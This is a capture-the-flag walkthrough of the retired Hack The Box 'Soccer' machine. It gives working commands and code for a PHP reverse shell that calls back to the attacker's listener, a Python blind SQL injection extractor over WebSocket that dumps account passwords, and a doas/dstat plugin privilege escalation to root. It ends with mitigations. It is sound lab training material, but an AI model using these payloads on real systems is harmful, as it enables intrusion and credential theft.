---
title: "Hack The Box — Soccer"
summary: "A practical Hack The Box Soccer walkthrough covering Tiny File Manager RCE, blind WebSocket SQL injection, SSH access, and doas/dstat privilege escalation."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Easy"
os: "Linux"
solvedAt: 2026-09-01
publishedAt: 2026-09-01
tags:
  - web-enumeration
  - default-credentials
  - file-upload
  - remote-code-execution
  - websocket
  - blind-sql-injection
  - ssh
  - doas
  - dstat
  - privilege-escalation
tools:
  - Nmap
  - ffuf
  - curl
  - Tiny File Manager
  - Python
  - websocket-client
  - Netcat
  - SSH
  - doas
  - dstat
cves:
  - CVE-2021-45010
htbUrl: "https://app.hackthebox.com/machines/Soccer"
cover: "/images/writeups/hackthebox/machines/soccer/soccer.png"
coverAlt: "Hack The Box Soccer machine artwork showing a football on a blue and green badge"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Soccer machine. Publication eligibility was verified on 1 September 2026 using the official HTB machine page. Flags, personal credentials, VPN data and unrelated identifiers have been removed.

## Machine information

Soccer is an easy Linux machine built around a realistic web-to-root chain. Default Tiny File Manager credentials expose a vulnerable upload workflow, a second virtual host introduces boolean-based blind SQL injection over WebSockets, and an unsafe `doas` rule turns a writable `dstat` plugin directory into root code execution.

| Item | Value |
| --- | --- |
| Platform | Hack The Box |
| Machine | Soccer (ID 519) |
| Difficulty | Easy |
| Operating system | Linux |
| Creator | sau123 |
| Release date | 17 December 2022 |
| Publication status | Retired — verified 1 September 2026 |
| Main weaknesses | Default credentials, file-upload RCE, blind SQL injection, unsafe privileged plugin loading |

The assigned target and VPN addresses are intentionally represented as `<TARGET_IP>` and `<VPN_IP>` because HTB addresses change between sessions and the VPN address identifies the player connection.

## Implementation overview and attack path

| Stage | Implementation | Result |
| --- | --- | --- |
| Network discovery | Full TCP Nmap scan with default scripts and version detection | Found SSH, nginx and a Node.js-style HTTP service on `9091` |
| Web discovery | Hostname resolution and content fuzzing | Found Tiny File Manager 2.4.3 under `/tiny/` |
| Initial access | Default admin credentials and an executable PHP upload | Reverse shell as `www-data` |
| Virtual-host discovery | nginx configuration review | Found `soc-player.soccer.htb` and its WebSocket ticket checker |
| Credential access | Boolean oracle over `ws://soc-player.soccer.htb:9091` | Extracted the `player` SSH credentials from MySQL |
| User access | SSH authentication | Read the user flag as `player` |
| Privilege escalation | Passwordless `doas` rule plus a writable `dstat` plugin directory | Executed a Python plugin as root and read the root flag |

In compact form:

```text
nginx → Tiny File Manager 2.4.3 → PHP reverse shell → www-data
      → WebSocket blind SQLi → player SSH → doas/dstat plugin → root
```

## Executive summary

I began with a full TCP scan and found ports `22`, `80` and `9091`. Web enumeration exposed Tiny File Manager 2.4.3, where the default `admin` credentials gave access to a web-accessible upload directory. Uploading and invoking a PHP reverse shell produced a foothold as `www-data`. Local nginx configuration disclosed `soc-player.soccer.htb`; its ticket checker sent an injectable numeric `id` to a WebSocket service on port `9091`. I converted the different “Ticket Exists” responses into a boolean SQL oracle and wrote a Python extractor that recovered the `player` SSH password. Finally, `player` could run `/usr/bin/dstat` as root through `doas`, while `/usr/local/share/dstat` was writable. A custom Python plugin therefore executed as root.

## Environment setup

I mapped the primary virtual host before browsing the application:

```bash
echo '<TARGET_IP> soccer.htb' | sudo tee -a /etc/hosts

curl -I http://soccer.htb/
whatweb http://soccer.htb/
```

The site returned `HTTP/1.1 200 OK` from `nginx/1.18.0` and identified itself as `Soccer - Index`.

## Initial enumeration

### Full TCP scan

The solve began with the following scan:

```bash
nmap <TARGET_IP> -T5 -sVC -p-
```

The relevant output was:

```text
22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http  nginx 1.18.0 (Ubuntu)
9091/tcp open  http  Node.js-style HTTP/WebSocket service
```

Port `80` redirected to `http://soccer.htb/`. Port `9091` returned Express-like responses such as `Cannot GET /`, which suggested an application backend rather than a conventional website.

### Correcting the content-discovery workflow

My first `ffuf` command failed because the expected SecLists path did not exist:

```bash
ffuf -u http://soccer.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .php,.txt,.html -fc 404
```

```text
stat .../directory-list-2.3-medium.txt: no such file or directory
```

I located the installed copies instead:

```bash
locate directory-list-2.3-medium.txt
```

```text
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

The next run produced many false positives with size `6917`. The DirBuster wordlist contains comment lines beginning with `#`; when placed in a URL, the fragment is not sent to the server, so those requests effectively reached `/` and returned the homepage. Ignoring comments and filtering the known homepage size fixed the scan:

```bash
ffuf -u http://soccer.htb/FUZZ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -ic -fs 6917 -c
```

This exposed the `/tiny/` application.

## Tiny File Manager foothold

Browsing to the discovered path opened Tiny File Manager 2.4.3:

```text
http://soccer.htb/tiny/
```

The default administrative credentials were still active:

```text
Username: admin
Password: admin@123
```

Tiny File Manager versions before 2.4.7 are affected by [CVE-2021-45010](https://nvd.nist.gov/vuln/detail/CVE-2021-45010), an authenticated path-traversal weakness in the upload functionality that can place executable PHP in the webroot. On this machine, authenticated access also exposed the writable, web-accessible `tiny/uploads` directory, so I did not need to manually modify the multipart `fullpath` parameter.

### Preparing and uploading the callback

I reused Kali's packaged PHP reverse shell, replacing its callback address and port:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php rev.php
sed -i 's/127.0.0.1/<VPN_IP>/; s/1234/4444/' rev.php
rlwrap nc -lvnp 4444
```

After navigating to `tiny/uploads` in the file manager, I uploaded `rev.php` and invoked it:

```bash
curl --max-time 5 http://soccer.htb/tiny/uploads/rev.php
```

The listener received the connection:

```text
connect to [<VPN_IP>] from (UNKNOWN) [<TARGET_IP>]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

I upgraded the shell with Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

```text
www-data@soccer:/$ whoami
www-data
```

## Internal enumeration and the second virtual host

The nginx configuration was the natural place to look for routes not linked from the public site:

```bash
grep -RniE 'server_name|proxy_pass|9091' \
  /etc/nginx/sites-enabled /etc/nginx/sites-available 2>/dev/null
```

This led to:

```text
soc-player.soccer.htb
```

The exact terminal output from this transition was not retained in the session transcript. The resulting virtual host, authenticated `/check` page and WebSocket connection to port `9091` were captured and verified, so the discovery command above is reconstructed from the workflow rather than presented as preserved output.

I added the host locally:

```bash
echo '<TARGET_IP> soc-player.soccer.htb' | sudo tee -a /etc/hosts
```

After creating a temporary site account and logging in, `/check` displayed a ticket-number lookup. The temporary account details were personal to the solve and are omitted.

## Blind SQL injection over WebSockets

Firefox showed a successful `101 Switching Protocols` connection to:

```text
ws://soc-player.soccer.htb:9091
```

The application sent ticket numbers as JSON:

```json
{"id":"86881"}
```

Rather than continuing in the browser developer tools, I used Python's `websocket-client` module. A true and false condition produced different responses:

```bash
python3 -c 'import websocket,json; w=websocket.create_connection("ws://soc-player.soccer.htb:9091"); w.send(json.dumps({"id":"0 OR 1=1-- -"})); print("TRUE :",w.recv()); w.send(json.dumps({"id":"0 OR 1=2-- -"})); print("FALSE:",w.recv()); w.close()'
```

```text
TRUE : Ticket Exists
FALSE: Ticket Doesn't Exist
```

Using `0 OR ...` ensured the original ticket expression could not make both tests true. The different messages formed a reliable boolean oracle.

### Automated extractor

I wrote `ws_dump.py` to infer the length and ASCII value of each character with binary search:

```python
import json
import sys
import websocket

URL = "ws://soc-player.soccer.htb:9091"
ws = websocket.create_connection(URL, timeout=10)

def oracle(condition):
    payload = {"id": f"0 OR ({condition})-- -"}
    ws.send(json.dumps(payload))
    return ws.recv().strip() == "Ticket Exists"

def dump_value(expression, label, max_length=256):
    low, high = 0, max_length
    while low < high:
        middle = (low + high + 1) // 2
        if oracle(f"LENGTH(({expression})) >= {middle}"):
            low = middle
        else:
            high = middle - 1

    length = low
    print(f"[+] {label} length: {length}")
    result = ""

    for position in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            middle = (low + high) // 2
            condition = (
                f"ASCII(SUBSTRING(({expression}),{position},1)) "
                f"> {middle}"
            )
            if oracle(condition):
                low = middle + 1
            else:
                high = middle

        result += chr(low)
        print(f"\r[+] {label}: {result}", end="")
        sys.stdout.flush()

    print()
    return result

database = dump_value("database()", "Database")
tables = dump_value(
    "SELECT GROUP_CONCAT(table_name) "
    "FROM information_schema.tables WHERE table_schema=database()",
    "Tables",
)
columns = dump_value(
    "SELECT GROUP_CONCAT(column_name) "
    "FROM information_schema.columns "
    "WHERE table_schema=database() AND table_name='accounts'",
    "Accounts columns",
)
credentials = dump_value(
    "SELECT GROUP_CONCAT(CONCAT(username,0x3a,password) "
    "SEPARATOR 0x7c) FROM accounts",
    "Credentials",
)
ws.close()
```

The live extraction returned:

```text
[+] Database: soccer_db
[+] Tables: accounts
[+] Accounts columns: email,id,password,username
[+] Credentials: player:PlayerOftheMatch2022|<redacted-temporary-web-account>
```

The temporary web account was removed from the output because it contained a personal identifier. The `player` credential belongs exclusively to this retired lab and is necessary to reproduce the transition to SSH.

## SSH access and the user flag

I authenticated with the extracted account:

```bash
ssh player@<TARGET_IP>
```

```text
player@<TARGET_IP>'s password: PlayerOftheMatch2022
player@soccer:~$ whoami
player
```

The user flag was present at `/home/player/user.txt`. Its value is intentionally omitted.

## Privilege escalation through doas and dstat

Local enumeration revealed a SUID installation of `doas`, an alternative to `sudo`:

```bash
ls -l /usr/local/bin/doas
cat /usr/local/etc/doas.conf
```

```text
-rwsr-xr-x 1 root root 42224 Nov 17  2022 /usr/local/bin/doas
permit nopass player as root cmd /usr/bin/dstat
```

The policy allowed `player` to run `dstat` as root without a password. That alone would not necessarily provide a shell, but `dstat` loads Python plugins and one of its plugin directories was writable:

```bash
find /usr/local/share/dstat /usr/share/dstat \
  -type d -writable 2>/dev/null
```

```text
/usr/local/share/dstat
```

I created a plugin named `dstat_pwn.py`. The `--pwn` option makes `dstat` import that file, and the import replaces the privileged process with Bash:

```bash
echo 'import os; os.execv("/bin/bash", ["bash", "-p"])' \
  > /usr/local/share/dstat/dstat_pwn.py

/usr/local/bin/doas -u root /usr/bin/dstat --pwn
```

The deprecation warning did not affect exploitation:

```text
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated
root@soccer:/home/player# whoami
root
```

The root flag was present at `/root/root.txt`. Its value is intentionally omitted.

## What did not work

- The first `ffuf` run referenced a wordlist path that was not installed. `locate` identified the correct locations.
- The DirBuster comments generated noisy homepage results until I added `-ic` and filtered response size `6917`.
- Firefox initially showed the WebSocket handshake but no frames because no new ticket check had been sent. A direct Python client made testing and automation clearer.
- I did not need Burp or `sqlmap`; the stable true/false response made a purpose-built extractor straightforward.

## Completion

| Objective | Access path | Result |
| --- | --- | --- |
| User flag | SSH as `player` | Captured; value omitted |
| Root flag | `doas` → `dstat` custom plugin | Captured; value omitted |

This completed the machine with a shell as `root`.

## Key takeaways

- Treat default credentials as a complete trust-boundary failure, especially on administrative file-management tools.
- WebSockets do not make SQL injection safer; the same input-validation rules apply outside normal HTTP forms.
- A boolean oracle can be enough to recover structured data efficiently when combined with binary search.
- Privileged allow-listing must account for extension and plugin mechanisms, not only the main executable name.
- Writable code-search paths are dangerous whenever a privileged interpreter or application imports from them.
- Preserve failed commands and decisive outputs. The wrong wordlist path and noisy `ffuf` responses explain why the final enumeration command changed.

## Mitigations

| Weakness | Defensive action |
| --- | --- |
| Default Tiny File Manager credentials | Remove default accounts, enforce unique credentials and restrict administrative access by network policy |
| Vulnerable Tiny File Manager | Upgrade to a fixed release, disable unnecessary uploads and prevent script execution in upload directories |
| WebSocket SQL injection | Use parameterized queries, validate message schemas and test WebSocket handlers with the same rigor as HTTP endpoints |
| Credential exposure | Store passwords with a modern password hash and isolate application credentials from operating-system accounts |
| Unsafe `doas` rule | Remove unnecessary privileged commands or constrain arguments and execution context |
| Writable `dstat` plugin directory | Make plugin paths root-owned and non-writable by unprivileged users |
| Detection gaps | Alert on unexpected PHP uploads, WebSocket SQL syntax, unusual `doas` execution and new `dstat_*.py` files |

## Tools used

- **Nmap** for full TCP and service enumeration.
- **ffuf**, **curl** and **WhatWeb** for HTTP discovery and validation.
- **Tiny File Manager** and a PHP reverse shell for the initial foothold.
- **Python** with **websocket-client** for SQLi validation and extraction.
- **SSH** for the stable `player` session.
- **doas** and **dstat** for the confirmed privilege-escalation path.

## References

- [Hack The Box — Soccer machine](https://www.hackthebox.com/machines/Soccer)
- [Hack The Box streaming and write-up guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
- [NVD — CVE-2021-45010](https://nvd.nist.gov/vuln/detail/CVE-2021-45010)
- [Tiny File Manager project](https://github.com/prasathmani/tinyfilemanager)
- [OpenBSD doas manual](https://man.openbsd.org/doas)
- [GTFOBins — dstat](https://gtfobins.github.io/gtfobins/dstat/)
- [Browse all Hack The Box write-ups](/writeups/)
